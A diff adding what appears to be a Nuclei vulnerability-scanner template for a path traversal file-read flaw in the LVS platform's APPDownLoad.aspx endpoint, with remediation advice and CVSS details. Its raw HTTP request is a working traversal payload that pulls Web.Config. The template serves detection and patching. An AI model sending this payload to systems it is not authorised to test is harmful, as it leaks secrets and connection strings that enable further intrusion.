@@ -1,0 +1,48 @@
+id: lvs-appdownload-lfi
+
+info:
+  name: LVS /Business/APPDownLoad.aspx - Arbitrary File Read (Path Traversal)
+  author: qwtd
+  severity: high
+  description: |
+    LVS exposes an arbitrary file read vulnerability in /Business/APPDownLoad.aspx.
+    By manipulating the 'p' parameter with directory traversal sequences, an attacker may read files outside the intended
+    download directory (e.g., Web.Config), potentially disclosing sensitive configuration data.
+  remediation: |
+    - Apply the vendor security patch/upgrade to a fixed version as soon as possible.
+    - Validate and normalize the 'p' parameter (canonicalize path) and enforce an allow-list of downloadable files.
+    - Deny any path containing traversal tokens (../, ..\) and encoded equivalents.
+    - Restrict access to the download endpoint to authenticated users and limit exposure to trusted networks.
+    - Ensure sensitive configuration files are not readable by the web process and are stored outside the web root when possible.
+  impact: |
+    Successful exploitation may disclose sensitive configuration data such as connection strings, secrets, internal paths,
+    and other operational details that can be used for further compromise.
+  classification:
+    cwe-id: CWE-22
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  metadata:
+    vendor: lvs
+    product: lvs-platform
+    verified: false
+    max-request: 1
+  tags: LVS精益价值管理系统
+
+http:
+  - raw:
+      - |
+        GET /Business/APPDownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'configuration'
+          - '<?xml'
+        condition: and
+
+      - type: status
+        status:
+          - 200
